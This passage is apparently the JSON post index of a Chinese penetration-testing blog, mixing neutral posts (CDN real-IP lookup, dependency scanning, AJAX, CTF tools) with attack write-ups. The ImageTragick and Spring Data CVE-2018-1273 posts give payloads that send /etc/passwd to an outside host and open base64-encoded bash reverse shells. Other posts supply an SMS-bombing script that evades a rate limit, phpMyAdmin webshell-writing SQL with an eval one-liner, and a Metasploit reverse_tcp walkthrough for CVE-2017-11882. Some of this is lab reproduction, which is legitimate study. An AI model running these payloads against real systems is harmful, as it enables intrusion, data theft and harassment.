0&gt;1是将标准输入重定向到文件名为1的文件，不存在就创建所以为了区别，那就在1前面加个&amp;来表示标准输出。 0&gt;&amp;1 0x004 关于 /dev/tcp/host/port 我们知道linux一切皆文件，但是其实这个文件肯定是不存在的 我们可以从man文档中看到 1234567root@kali:~# man bash | grep &quot;/dev/tcp&quot; -A 5 /dev/tcp/host/port If host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open the corresponding TCP socket. /dev/udp/host/port If host is a valid hostname or Internet address, and port 那么这个是在主机名、ip地址以及端口有效的情况，会打开一个TCP的套接字，连接对应主机的对应端口","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.vkxss.top/categories/Linux/"}],"tags":[{"name":"反弹Shell","slug":"反弹Shell","permalink":"http://www.vkxss.top/tags/反弹Shell/"}]},{"title":"绕CDN，网站真实IP记录","slug":"渗透测试-绕CDN，网站真实IP记录","date":"2019-04-18T04:25:40.000Z","updated":"2019-12-12T08:08:26.115Z","comments":true,"path":"2019/04/18/渗透测试-绕CDN，网站真实IP记录/","link":"","permalink":"http://www.vkxss.top/2019/04/18/渗透测试-绕CDN，网站真实IP记录/","excerpt":"","text":"### 0x01 绕CDN，验证是否存在CDN方法1 超级 ping ，查看对应 IP 地址是否唯一，如果不唯一大概率使用了CDN， ping一个站，响应多个IP，肯定用了CDN，多地 Ping 网站有很多，如下，根据响应包判断是否存在CDN 123http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ 方法2 nslookup 进行检测，如果返回域名解析对应多个 IP 地址大概率使用了 CDN。 12345678910111213141516171819202122232425262728 比如： &gt; www.163.com 服务器: public1.114dns.com Address: 114.114.114.114 非权威应答: 名称: 163.xdwscache.ourglb0.com Addresses: 58.223.164.86 125.75.32.252 Aliases: www.163.com www.163.com.lxdns.com 在比如： 无 CDN 的示例： &gt; je2se.com 服务器: public1.114dns.com Address: 114.114.114.114 非权威应答: 名称: je2se.com Address: 192.168.1.1 ``` ##### 方法3- 还有使用各种工具帮助检测目标网站是否使用了 CDN， - 比如： http://www.cdnplanet.com/tools/cdnfinder/ http://www.ipip.net/ip.html 123456 - 绕过 CDN 查找网站真实 IP - 查询历史DNS记录 - 查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录， - 比如： https://dnsdb.io/zh-cn/ https://x.threatbook.cn/ http://toolbar.netcraft.com/site_report?url= http://viewdns.info/ 查询子域名 很多站长也许只会对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过子域名查询对应的 IP 来辅助查找网站的真实IP。 利用网站漏洞 /滑稽 ，利用漏洞目标服务器主动来连接我们，这样就能知道真实IP，比如XSS盲打，命令执行反弹shell，SSRF等等。 服务器合法服务主动连接我们 一样的思路就是让服务器主动连接我们告诉我们它的IP，不过使用的是合法的服务，如RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。 使用国外主机解析域名 国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。 目标敏感文件泄露 也许目标服务器上存在一些泄露的敏感文件中会告诉我们网站的IP，另外就是如 phpinfo之类的探针了。 从 CDN 入手 无论是用社工还是其他手段，反正是拿到了目标网站管理员在CDN的账号了，此时就可以自己在CDN的配置中找到网站的真实IP了。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"Jar第三方组件漏洞检查工具","slug":"Jar第三方组件漏洞检查工具","date":"2019-02-22T07:30:08.000Z","updated":"2019-12-15T15:34:13.656Z","comments":true,"path":"2019/02/22/Jar第三方组件漏洞检查工具/","link":"","permalink":"http://www.vkxss.top/2019/02/22/Jar第三方组件漏洞检查工具/","excerpt":"","text":"0x00 工具介绍 dependency-check是一款根据项目依赖来检查漏洞的白盒审计工具。他根据项目中的依赖库，搜集依赖的版本，厂商等信息，然后匹配NVD漏洞库，对比其中的CPE来确定此版本的依赖包是否存在漏洞。他虽然最主要是用来检查java项目的依赖，但是对于js,c/c++,python，它也是具有一定的检查能力。 它支持多种使用方式，各有优缺点。无论是jar包，还是目录，或者压缩文件，他都能自动识别。 0x01 安装与运行 Dependency Check官网：https://www.owasp.org/index.php/OWASP_Dependency_Check Dependency Check官方文档：https://jeremylong.github.io/DependencyCheck/index.html Dependency Check有三种使用方式： 从命令行使用：此时Dependency Check作为一个单独的软件，与项目无关，使用时只需指定需要扫描的项目位置即可。在业务上线流程中推荐使用此方式 作为插件在项目中使用：此时需要在项目的配置文件中做相关内容添加，只对当前项目有效。别的项目需要使用时，需要重新修改配置文件 作为Ant Task使用：这种方式的使用介于以上两者之间，可以在多个项目中使用，但是需要安装，并且需要在项目的build.xml中添加相关配置。 下载使用说明： 从命令行使用时Dependency Check作为一个单独的软件，需要从官网下载。 官网右侧Quick Download目录下选择Command Line即可。 下载后解压即可使用。 如果是windows平台，运行bin目录下dependency-check.bat； 如果是linux，运行dependency-check.sh； 如果是mac平台，使用brew install dependency-check即可安装。 注意：第一次扫描的时候会需要等待很长时间。因为Dependency Check需要将从NVD下载数据库，则可能需要花十分钟甚至二十分钟。在这之后，只要两次扫描的间隔时间不超过七天，就只需要维护一个很小的xml列表，它会在每次启动扫描的时候自动更新，大约只需要一分钟左右。 如何使用： windows使用: dependency-check.bat –project “My App Name” –scan “c:\\java\\application\\lib” 参数说明： project用于指定这个扫描项目的名字（不是要扫描的项目，而是扫描这个任务的项目名字，可以随便指定） scan指定要扫描的压缩文件或者目录。Linux平台类似，只是把.bat换成.sh。第一次使用会很慢，因为要下载相应的NVD库。","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"什么是AJAX","slug":"前端安全-什么是AJAX","date":"2019-02-07T07:30:08.000Z","updated":"2019-10-15T05:18:40.231Z","comments":true,"path":"2019/02/07/前端安全-什么是AJAX/","link":"","permalink":"http://www.vkxss.top/2019/02/07/前端安全-什么是AJAX/","excerpt":"","text":"一、什么是Ajax? AJAX全称为“Asynchronous JavaScript and XML”(异步JavaScript和XML),是一种创建交互式网页应用的网页开发技术 Ajax是一种技术方案，但并不是一种新技术。它依赖现有的CSS/HTML/JavaScript，而其中最核心的依赖是浏览器提供的XMLHttpRequest对象，是这个对象使得浏览器可以发出HTTP请求与接收HTTP响应。实现了在页面不刷新个情况下和服务器进行数据交互。 这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。 二、如何实现Ajax？ (1)创建XMLHttpRequest对象,也就是创建一个异步调用对象. (2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息. (3)设置响应HTTP请求状态变化的函数. (4)发送HTTP请求. (5)获取异步调用返回的数据. (6)使用JavaScript和DOM实现局部刷新. 0x01 Demo user.json 1234&#123; &quot;name&quot;:&quot;VK&quot;, &quot;age&quot;:&quot;25&quot;&#125; ajax.html 0x02 演示 网站A获取网站B的用户数据： 网站A：http://vkduang.com/AJAX/ajax.html 网站B：http://vkkuayu.com:8000/user.json 你会发现console报出了如下的错误; 很明显请求是受到同源策略的限制。 0x03 哪些资源是默认可以跨域的 上面定义提到了”受限制”, 也就是说不是所有的跨域资源需要CORS机制。 思考🤔","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://www.vkxss.top/categories/前端安全/"}],"tags":[{"name":"前端知识","slug":"前端知识","permalink":"http://www.vkxss.top/tags/前端知识/"}]},{"title":"CTF中常见的加解密集合","slug":"CTF-常见的加解密集合","date":"2019-01-07T20:25:40.000Z","updated":"2019-09-25T08:48:06.828Z","comments":true,"path":"2019/01/08/CTF-常见的加解密集合/","link":"","permalink":"http://www.vkxss.top/2019/01/08/CTF-常见的加解密集合/","excerpt":"","text":"CTF中常见的加解密集合 CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 今天我们来聊聊CTF中杂项遇到过的常见的加解密吧！ 转载-原文链接 整理了几个免费的解密网站（长按跳转） http://ctf.ssleye.com/ https://www.qqxiuzi.cn/ https://www.ctftools.com/down/ https://tool.bugku.com/?wafcloud=1 http://www.nicetool.net","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.vkxss.top/categories/CTF/"}],"tags":[{"name":"加解密集合","slug":"加解密集合","permalink":"http://www.vkxss.top/tags/加解密集合/"}]},{"title":"Mac下使用夜神模拟器调试","slug":"APP-Mac下使用夜神模拟器调试","date":"2018-12-18T20:25:40.000Z","updated":"2019-09-20T02:01:52.896Z","comments":true,"path":"2018/12/19/APP-Mac下使用夜神模拟器调试/","link":"","permalink":"http://www.vkxss.top/2018/12/19/APP-Mac下使用夜神模拟器调试/","excerpt":"","text":"1、遇到的问题： 1.1、描述： 1.2、解决： 1、遇到的问题：1.1、描述： 首先去夜神官网下载mac版最新app，吐槽一下，内置应用很不爽，那么Mac使用夜神模拟器调试，遇到adb无法连接夜神模拟器，怎么办？ 1.2、解决： 使用adb devices命令会发现，没有此设备，添加设备，网上有很多方法，主要是将usb文件号加入adb_usb.ini中，不赘述。再次运行adb devices，发现还是找不到设备，使用了一个取巧的办法，夜神模拟器的服务默认监听在62001端口，所以使用adb connect 127.0.0.1:62001 通过adb connect命令利用TCP/IP协议来连接。 进入设备","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APP渗透测试","slug":"APP渗透测试","permalink":"http://www.vkxss.top/tags/APP渗透测试/"}]},{"title":"Imagetragick 命令执行漏洞","slug":"CVE-2016–3714","date":"2018-10-12T07:30:08.000Z","updated":"2019-12-03T06:38:58.591Z","comments":true,"path":"2018/10/12/CVE-2016–3714/","link":"","permalink":"http://www.vkxss.top/2018/10/12/CVE-2016–3714/","excerpt":"","text":"漏洞简介 影响版本： 漏洞挖掘 利用方式： Reference 漏洞简介 Imagetragick 命令执行漏洞在16年爆出来以后，wooyun上面也爆出了数个被该漏洞影响的大厂商，像腾讯， 新浪，慕课….影响巨大，这里贴出wooyun上关于此漏洞的案例：http://wooyun.org/bugs/wooyun-2016-0205125 ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。 但有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。 国外的安全人员为此新建了一个网站： https://imagetragick.com/ 与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717， 其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。 影响版本： ImageMagick 6.5.7-8 2012-08-17(手工测试风险存在) ImageMagick 6.7.7-10 2014-03-06(手工测试风险存在) 低版本至6.9.3-9 released 2016-04-30 漏洞挖掘 上传头像 上传照片 插入图片 等等 利用方式： Poc代码： 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://&quot;| curl dnslog&quot;)&apos;pop graphic-context 执行命令，构造POC： 读取/etc/passwd 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://&quot;| wget --post-file /etc/passwd dnslog&quot;)&apos;pop graphic-context 执行命令，构造POC： 如果接收到http请求，说明curl命令执行成功。 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://127.0.0.0/joker.jpg&quot;|curl &quot;192.168.0.132:4444)&apos;pop graphic-context 构造反弹shell，POC： 这里的 /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.132/4444 0&gt;&amp;1 需要用base64加密 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://127.0.0.0/bmjoker.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xMzIvNDQ0NCAwPiYx | base64 -d | bash`&quot;||id &quot; )&apos;pop graphic-context Reference https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html https://www.anquanke.com/post/id/83871 https://wooyun.x10sec.org/static/bugs/wooyun-2016-0214787.html https://wooyun.x10sec.org/static/bugs/wooyun-2016-0205530.html","categories":[{"name":"CVE-2016","slug":"CVE-2016","permalink":"http://www.vkxss.top/categories/CVE-2016/"}],"tags":[{"name":"CVE-2016–3714","slug":"CVE-2016–3714","permalink":"http://www.vkxss.top/tags/CVE-2016–3714/"}]},{"title":"绕过一分钟限制短信轰炸","slug":"Python-短信轰炸脚本","date":"2018-10-12T04:25:40.000Z","updated":"2019-11-20T05:09:48.519Z","comments":true,"path":"2018/10/12/Python-短信轰炸脚本/","link":"","permalink":"http://www.vkxss.top/2018/10/12/Python-短信轰炸脚本/","excerpt":"","text":"一分钟短信轰炸脚本 一分钟短信轰炸脚本 当前后端校验60秒倒计时时，使用该脚本进行短信轰炸 12345678910111213141516171819202122232425262728293031323334#coding=utf-8# python 3.6.0import requestsimport randomimport time import jsonheaders=&#123; &quot;Host&quot;: &quot;qq.com&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Referer&quot;: &quot;https://qq.com/mng/&quot;, &quot;Cookie&quot;: &quot;XXX&quot;, &#125;def Send(): try: url = &quot;https://qq.com/&quot; data = &#123;&quot;phone&quot;:&quot;number&quot;,&quot;_qq_csrf&quot;:&quot;5d184ad253da6af72fec3106bfe3e8f79fa5a502&quot;&#125; # data为json数据 # res = requests.post(url=url,headers=headers,data=json.dumps(data)) res = requests.post(url=url,headers=headers,data=data) print (&apos;Phone:number&apos; + &apos;ReturnValue:&#123;&#125;&apos;.format(res.text)) except Exception as e: print(e)if __name__==&quot;__main__&quot;: for i in range(30): time.sleep(65) Send()","categories":[{"name":"Python","slug":"Python","permalink":"http://www.vkxss.top/categories/Python/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"DOCX文件弹出XSS","slug":"渗透测试-DOCX文件弹出XSS","date":"2018-07-28T07:30:08.000Z","updated":"2019-09-22T17:11:51.250Z","comments":true,"path":"2018/07/28/渗透测试-DOCX文件弹出XSS/","link":"","permalink":"http://www.vkxss.top/2018/07/28/渗透测试-DOCX文件弹出XSS/","excerpt":"","text":"背景： 如何使用Microsoft Word文档（docx格式）将跨站点脚本（XSS）漏洞上传到Web服务器 支持在线读取word文档 或者允许上传html文件，浏览器并成功解析(Content-Type为text/html) 构造XSS弹框word 方式一： Microsoft Word文档的核心是一个包含XML和Word文件; 我们可以通过运行Linux命令strings file-sample.docx来查看文件中所有的ASCII字符，以查看可用的字符串; 将文件解压缩，方便我们在不损坏文件的情况下，修改它； 例如修改settings.xml为aaaaaaaaa.xml; 然后输入zip -r 重新打包，生成新文件; 利用ultraedit文本编辑器查看十六进制代码块找到A的字符串,并修改为js代码; 12345# strings file-sample.docx# unzip file-sample.docx# cd word# mv settings.xml aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xml# zip -r test.docx * 方式二： 直接利用ultraedit文本编辑器找到word文档空白位置,在不破坏文档的情况下，修改为JS代码保存即可; 防护措施 这样的效果对于开发者来说应该采取以下手段来进行限制。 文件上传之前，在服务器端验证上传文件格式是否为.doc或.docx有效格式； 严格限制Content-Type头，对Content-Type头或特定后缀格式更改过的上传文件须保持与上传文件相同的Content-Type头信息； 控制文件下载时的其它操作情况，添加响应标头:“Content-Disposition: attachment”，以防止在浏览器中内嵌显示文件； 过滤掉所有包含HTML标签的上传，因为docx可经压缩篡改其中包含的HTML文件。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"PhpMyadmin_Getshell","slug":"渗透测试-PhpMyadmin_Getshell","date":"2018-06-17T07:30:08.000Z","updated":"2019-10-15T05:47:18.777Z","comments":true,"path":"2018/06/17/渗透测试-PhpMyadmin_Getshell/","link":"","permalink":"http://www.vkxss.top/2018/06/17/渗透测试-PhpMyadmin_Getshell/","excerpt":"","text":"phpmyadmin_getshell 0x01 into outfile 0x02 利用日志getshell phpmyadmin_getshell 当发现存有phpmyadmin目录时，进而通过弱口令或者暴力破解进入数据库之后，如何getshell? 写入WebShell主要条件： Root数据库用户（root权限） 网站绝对路径（确定有写入权限） magic_quotes_gpc：Off（关闭） 写入WebShell其它条件： magic_quotes_gpc：开启时，会对’单引号进行转义，使其变成“\\”反斜杠。 secure_file_priv：此配置项用来完成对数据导入导出的限制，如允许导入导出到指定目录。 file_priv：file_priv权限允许你用load_file、into outfile读和写服务器上的文件，任何被授予这个权限的用户都能读和写服务器的任何文件。 0x01 into outfile 0x001前提条件： 1.Root数据库用户（root权限） 2.网站绝对路径（确定有写入权限） 12345暴绝对路径phpMyAdmin/libraries/select_lang.lib.phpphpMyAdmin/darkblue_orange/layout.inc.phpphpMyAdmin/index.php?lang[]=1phpmyadmin/themes/darkblue_orange/layout.inc.php 3.查看能否自定义导入导出数据到任意目录的权限 12345678查看能否自定义导出文件目录的权限 show global variables like &quot;%secure%&quot;; //查询secure_file_priv配置 secure_file_prive=null //不允许导入导出数据到目录 secure_file_priv=c:\\sec //允许导入导出数据到指定目录 secure_file_priv=&apos;&apos; //允许导入导出数据到任意目录 secure_file_priv=&quot;/&quot; //允许导入导出数据到任意目录 注：在my.ini、my.cnf、mysqld.cnf文件中找到secure_file_prive并将其值设置为&quot;&quot;或&quot;/&quot;，重启MySQL服务！ 0x002 导入一句话shell 123select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:/xampp/htdocs/1.php&apos;; select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:\\\\xampp\\\\htdocs\\\\2.php&apos;;select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into dumpfile &apos;c:\\\\xampp\\\\htdocs\\\\3.php&apos;; 0x003 测试写入phpinfo文件 select ‘‘ into dumpfile ‘c:\\xampp\\htdocs\\phpinfo.php’; 0x02 利用日志getshell 0x001 前提条件： 要求mysql的版本为5.0以上，因为5.0以上会创建日志文件 要求对日志有可读可写的权限 0x002 原理 phpmyadmin有一个记录日志的文件，但是一般情况下会关闭，开启日志记录，然后设置日志记录名称为.php，随便执行sql语句，只要包括一句话木马就会被写入到日志中去，然后就可以连接getshell 0x003 日志备份获取shell show global variables like “%genera%”;//查询general_log配置 当前的状态是off，需要手动开启日志，输入以下命令： set global general_log=’on’; 然后再次查询general_log配置已变成ON，设置Webshell日志文件保存路径，Mysql会判断日志文件是否存在，如果不存在则会自动创建。输入以下命令： SET global general_log_file=’c:/xampp/htdocs/rizhi.php’; 查看日志文件保存路径，对应的就会生成rizhi.php文件 一句话写入日志文件 关闭 general_log模式 set global general_log=’off’; 使用蚁剑连接","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"Office远程代码执行漏洞(CVE-2017-11882)","slug":"CVE-2017-11882","date":"2018-05-08T07:30:08.000Z","updated":"2019-10-09T06:03:11.171Z","comments":true,"path":"2018/05/08/CVE-2017-11882/","link":"","permalink":"http://www.vkxss.top/2018/05/08/CVE-2017-11882/","excerpt":"","text":"漏洞概述 影响范围 复现环境 漏洞复现 修复 漏洞概述此漏洞是由Office软件里面的 [公式编辑器] 造成的，由于编辑器进程没有对名称长度进行校验，导致缓冲区溢出，攻击者通过构造特殊的字符，可以实现任意代码执行。 影响范围12345office 2003 office 2007 office 2010 office 2013 office 2016 复现环境123渗透机：Kali Linux + POC代码 靶机：Win10 + Office 2016工具已打包：https://github.com/vkbiu/CVE/tree/master/CVE-2017-11882 漏洞复现 生成word文档test.doc，打开doc文件之后，会弹出计算器（以此验证offce漏洞） 1python Command43b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc win10 office2016触发成功(win10会报毒) 在Kali Linux上构造带有shell后门的word文件，并开启监听。 把cve_2017_11882.rb复制到/usr/share/Metasploit-framework/modules/exploits/windows/smb 再Copycve-2017-11882.rtf复制到/usr/share/metasploit-framework/data/exploits 启动metasploit 123456789101112131415161718192021222324252627282930313233343536373839Metasploit running on Kali Linux as root, using system databaseA database appears to be already configured, skipping initialization .:okOOOkdc&apos; &apos;cdkOOOko:. .xOOOOOOOOOOOOc cOOOOOOOOOOOOx. :OOOOOOOOOOOOOOOk, ,kOOOOOOOOOOOOOOO: &apos;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&apos; oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO. cOOOOOOO.MMM.OOc.MMMMM&apos;oOO.MMM,OOOOOOOc oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl ;OOOO&apos;MMM.OOOO.MMM:OOOO.MMM;OOOO; .dOOo&apos;WM.OOOOocccxOOOO.MX&apos;xOOd. ,kOl&apos;M.OOOOOOOOOOOOO.M&apos;dOk, :kk;.OOOOOOOOOOOOO.;Ok: ;kOOOOOOOOOOOOOOOk: ,xOOOOOOOOOOOx, .lOOOOOOOl. ,dOd, . =[ metasploit v5.0.53-dev- ]+ -- --=[ 1931 exploits - 1079 auxiliary - 332 post ]+ -- --=[ 556 payloads - 45 encoders - 10 nops ]+ -- --=[ 7 evasion ]msf5 &gt; search 11882Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/fileformat/office_ms17_11882 2017-11-15 manual No Microsoft Office CVE-2017-11882 1 exploit/windows/smb/cve_2017_11882 2017-11-21 excellent No Microsoft Office Word Equation Editor RCE 使用CVE-2017-11882.rb模块，开启Meterpreter监听会话： 1234567891011121314151617msf5 &gt; use exploit/windows/smb/cve_2017_11882 #使用模块msf5 exploit(windows/smb/cve_2017_11882) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcp #设置tcp反弹会话msf5 exploit(windows/smb/cve_2017_11882) &gt; set lhost 192.168.36.131lhost =&gt; 192.168.36.131 #设置攻击机ip地址msf5 exploit(windows/smb/cve_2017_11882) &gt; set uripath 11882 #设置路径为11882，可自定义uripath =&gt; 11882msf5 exploit(windows/smb/cve_2017_11882) &gt; exploit[*] Exploit running as background job 2.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.36.131:4444 msf5 exploit(windows/smb/cve_2017_11882) &gt; [*] Generating command with length 44[+] msf.rtf stored at /root/.msf4/local/msf.rtf[*] Using URL: http://0.0.0.0:8080/11882[*] Local IP: http://192.168.36.131:8080/11882[*] Server started. 利用mshta，生成目标机的漏洞文档，命令如下： 12root@kali:~# python Command43b_CVE-2017-11882.py -c &quot;mshta http://192.168.36.131:8080/11882&quot; -o 11882.doc[*] Done ! output file --&gt; 11882.doc 将生成的文件拷贝到win10靶机中运行，即在kali中可以看到 成功后，使用命令sessions 查看你控制的pc 修复 在线更新，开启Windows Update更新。 打补丁，此漏洞对应的微软补丁地址：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882","categories":[{"name":"CVE-2017","slug":"CVE-2017","permalink":"http://www.vkxss.top/categories/CVE-2017/"}],"tags":[{"name":"CVE-2017-11882","slug":"CVE-2017-11882","permalink":"http://www.vkxss.top/tags/CVE-2017-11882/"}]},{"title":"CVE-2018-1273-RCE","slug":"CVE-2018-1273","date":"2018-04-13T07:30:08.000Z","updated":"2019-10-10T07:14:19.570Z","comments":true,"path":"2018/04/13/CVE-2018-1273/","link":"","permalink":"http://www.vkxss.top/2018/04/13/CVE-2018-1273/","excerpt":"","text":"漏洞概述 影响范围 复现环境 漏洞复现 修复建议 Reference 漏洞概述 Spring Data Commons组件中存在远程代码执行漏洞（CVE-2018-1273），攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。 影响范围 受影响的版本 Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10(Ingalls SR10) Spring Data Commons 2.0 - 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5(Kay SR5) 官方已经不支持的旧版本 不受影响的版本 Spring Data Commons ≥ 2.0.6 Spring Data Commons ≥ 1.13.11 Spring Data REST 2.6.11 (Ingalls SR11) Spring Data REST 3.0.6 (Kay SR6) Spring Boot 1.5.11 Spring Boot 2.0.1 复现环境 docker环境搭建： https://github.com/knqyf263/CVE-2018-1273 漏洞POC： https://github.com/vkbiu/CVE/tree/master/cve-2018-1273 漏洞复现 漏洞利用POC： 1username[#this.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;cp /etc/passwd /tmp&apos;)]=123 进入docker容器查看/tmp/目录下成功cp /etc/passwd文件 反弹shell payload： 1username[#this.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4xOTIvNTU3NyAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=123 修复建议 官方已经在最新版本中修复了该漏洞，请受影响的用户尽快升级，以保证长期有效的防护。下载链接请参考下表： 组件版本 下载链接 Spring Data Commons 2.0.6 https://github.com/spring-projects/spring-data-commons/archive/2.0.6.RELEASE.zip Spring Data Commons 1.13.11 https://github.com/spring-projects/spring-data-commons/archive/1.13.11.RELEASE.zip Spring Data REST 3.0.6 https://github.com/spring-projects/spring-data-rest/archive/3.0.6.RELEASE.zip Spring Data REST 2.6.11 https://github.com/spring-projects/spring-data-rest/archive/2.6.11.RELEASE.zip Spring Boot 2.0.1 https://github.com/spring-projects/spring-boot/archive/v2.0.1.RELEASE.zip Spring Boot 1.5.11 https://github.com/spring-projects/spring-boot/archive/v1.5.11.RELEASE.zip Reference http://xxlegend.com/2018/04/12/CVE-2018-1273-%20RCE%20with%20Spring%20Data%20Commons%20%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/","categories":[{"name":"CVE-2018","slug":"CVE-2018","permalink":"http://www.vkxss.top/categories/CVE-2018/"}],"tags":[{"name":"CVE-2018-1273","slug":"CVE-2018-1273","permalink":"http://www.vkxss.top/tags/CVE-2018-1273/"}]}]}